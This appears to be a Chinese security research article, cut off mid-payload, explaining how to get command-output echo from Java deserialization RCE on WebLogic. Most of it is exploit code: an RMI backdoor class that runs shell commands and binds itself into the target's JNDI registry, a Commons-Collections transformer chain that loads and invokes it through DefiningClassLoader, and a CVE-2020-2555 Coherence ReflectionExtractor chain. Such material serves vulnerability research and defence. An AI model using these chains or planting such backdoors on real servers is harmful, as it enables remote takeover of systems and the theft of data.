**作者：Skay @ QAX A-TEAM  
原文链接：**
阅读文章前希望先对ClassLoader以及defineClass有了解。[Java
RCE中类反射获取&动态加载](https://mp.weixin.qq.com/s/fkd1Qhgr4BcQXaguCd5TAg)
defineClass归属于ClassLoader类，目前很多java的回显方式都是在其基础上进行改进，其主要作用就是使用编译好的字节码就可以定义一个类。引用于[y4er](https://y4er.com/post/java-deserialization-echo/)
# 一、回显的几种方式
  * 直接调用defineClass
  * RMI绑定实例结合
  * 获取resp写入回显结果
  * 异常抛出 报错回显
  * 写文件
  * Dnslog
# 二、回显方式分析
## 1.RMI绑定实例结合
### (1) RMI/IIOP RCE回显的原理
#### 基本原理
talk is cheap，let‘s see the code
1.定义一个Echo接口，继承Remote类
    public interface Echo extends Remote {
        String exec(String cmd) throws RemoteException;
    }
2.实现这个接口
    public class EchoImpl implements Echo{
        @Override
        public String exec(String cmd) throws RemoteException {
            InputStream in = null;
            try {
                in = Runtime.getRuntime().exec(cmd).getInputStream();
            }catch (Exception e){
                e.printStackTrace();
            }
            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
            String result = s.hasNext()?s.next():"";
            return result;
        }
    }
3.服务端绑定EchoImpl
    public class EchoServer {
        public static void main(String[] args) throws Exception{
            Echo echo = new EchoImpl();
            Echo e = (Echo) UnicastRemoteObject.exportObject(echo,9999);
            Registry registry =  LocateRegistry.createRegistry(9999);
            registry.bind("Echo",e);
            System.out.println("Start RMI Server................");
        }
    }
4.客户端实现RMI远程方法调用
    public class EvilClient {
        public static void main(String[] args) throws Exception{
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",9999);
            Echo echo = (Echo) registry.lookup("Echo");
            System.out.println(echo.exec("ipconfig"));
        }
    }
最终实现效果
上面RMI回显原理有了，我们有了回显的方法，现在只需再RCE的漏洞利用中，重现构造出上述步骤。
#### **逻辑思路**
  * 利用漏洞点调用ClassLoader的defineClass方法
  * 写入类：defineClass在目标服务器运行返回我们构造的类(已经写好的RMI接口类)
  * 绑定类：将RMI接口类绑定到目标服务器，也就是将我们构造的恶意类注册到rmi注册中心
  * 攻击者本地远程调用方法获取回显结果
**首先，我们先将需要绑定的恶意类准备好。**
我们需要目标存在一个继承了Remote的接口，并且接口方法返回类型为String(因为要返回命令执行的结果)且抛出RemoteException异常，然后本地构造一个类实现这个接口。
直接在Remote类下Ctrl+H
weblogic_cmd用的是这个
本地构造EvilImpl
    public class EvilImpl implements ClusterMasterRemote {
        @Override
        public void setServerLocation(String s, String s1) throws RemoteException {
        }
        @Override
        public String getServerLocation(String cmd) throws RemoteException {
            try {
                List cmds = new ArrayList();
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }
**恶意类准备好了，接下来就是绑定到目标服务器。** 这里使用到的代码
    RemoteImpl remote = new RemoteImpl();
    try {
        Context context = new InitialContext();
        context.rebind("Evil",remote);
    } catch (Exception e) {
        e.printStackTrace();
    }
在服务端执行上述代码即可将而已类绑定到目标服务器，问题是我们怎么执行上述代码？ 将上述代码写到我们构造的EvilImpl
main方法中，definClass获取到EvilImpl 的 Class后直接利用 **CC** 或者 **coherence** 进行反射调用。
所以我们修改EvilImpl如下
    public class EvilImpl implements ClusterMasterRemote {
        public static void main(String[] args) {
            EvilImpl remote = new EvilImpl();
            try {
                Context context = new InitialContext();
                context.rebind("Evil",remote);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        @Override
        public void setServerLocation(String s, String s1) throws RemoteException {
        }
        @Override
        public String getServerLocation(String cmd) throws RemoteException {
            try {
                List cmds = new ArrayList();
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }
**下面还剩最后一个问题，获取defineClass**
，有多种实现方式，可以在Weblogic中找ClassLoader的子类，也可以从Thread中获取，也可直接反射调用。
### (2) Weblogic 结合CC链 回显实现
上面回显原理已经将大体流程说明完毕，CC的引入就是为了解决两个问题，defineClass的获取，以及EvilImpl类main方法的反射调用。
#### defineClass的获取
网上大多是直接找的ClassLoader的子类
    jxxload_help.PathVFSJavaLoader#loadClassFromBytes
    org.python.core.BytecodeLoader1#loadClassFromBytes
    sun.org.mozilla.javascript.internal.DefiningClassLoader#defineClass
    java.security.SecureClassLoader#defineClass(java.lang.String, byte[], int, int, java.security.CodeSource)
    org.mozilla.classfile.DefiningClassLoader#defineClass
org.mozilla.classfile.DefiningClassLoader#defineClass 使用这个
#### CC链构造
接下来就是结合CC利用链进行构造，首先获取defineClass，然后调用我们EvilImple的main方法。CC是可以调用任意类的任意方法的，所以构造起来也很容易(当然了，是站在前人的肩膀上，手动狗头)
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(DefiningClassLoader.class),
        new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
        new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
        new InvokerTransformer("defineClass",
                               new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
        new ConstantTransformer(new HashSet())
    };
至此，整个回显过程就串起来了，weblogic的反序列化RCE为漏洞点，CC链串起来回显的整个过程：从defineClass的调用到EvilImple的绑定，最后攻击者本地调用远程方法即可实现回显。
### (3) Weblogic 结合coherence链 回显实现
虽然上述回显已经成功，但是CC链早就被Weblogic放入了黑名单，且在18年补丁之后，Weblogic修改了自身的cc依赖，使之不能反序列化。新的漏洞需要实现回显，需要重新找出一个可以替代CC的链
---> coherence中的LimitFilter
首先复习以下CVE-2020-2555的利用链 BadAttributeValueExpException -> readObject ->
LimitFilte的toString(Coherence中) -> ReflectionExtractor的extract() ->
method.invoke()
payload如下
     // Runtime.class.getRuntime()
            ReflectionExtractor extractor1 = new ReflectionExtractor(
                    "getMethod",
                    new Object[]{"getRuntime", new Class[0]}
            );
            // get invoke() to execute exec()
            ReflectionExtractor extractor2 = new ReflectionExtractor(
                    "invoke",
                    new Object[]{null, new Object[0]}
            );
            // invoke("exec","calc")
            ReflectionExtractor extractor3 = new ReflectionExtractor(
                    "exec",
                    new Object[]{new String[]{"cmd", "/c", "calc"}}
            );
            ReflectionExtractor[] extractors = {
                    extractor1,
                    extractor2,
                    extractor3,
            };
            ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
            LimitFilter limitFilter = new LimitFilter();
            //m_comparator
            Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(limitFilter, chainedExtractor);
            //m_oAnchorTop
            Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");